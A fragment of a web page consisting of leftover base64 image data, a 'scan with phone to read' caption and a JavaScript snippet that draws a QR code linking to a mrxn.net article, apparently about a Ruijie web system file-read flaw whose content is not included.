3AV2HzuupOFvQc9C5Nfv7TU0OvRY6Nyfue9a1OvS68mrpi6XVmhxSX14tCIdP/LGB1A2u9fcn8NcDgUzXrfhUTJy+fCL0ftC5eTjqEM17mxXVRUgeOpoXIb58IsSH4PQnh3Xurwcyb3bxvzuBw0B8eiaubmNOH/r0ofOZg/gQ1F/hvN8+Nz1Iz6/q5iB1ENzfo66h69aVV0sOycm/goeBVMNrve4EtoFApgmPcbVVpz99dRHSXy5at+LqcF5fPsSbvSA6BCtby5wI3a9MLf263i916HXqZiE+BPVFiA5c/+rk9mZf2yvkzfb1f7ud/wEAAP//f5yjAgAAAAZJREFUAwATeDGnIMObDgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-system\_pi-timeout-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 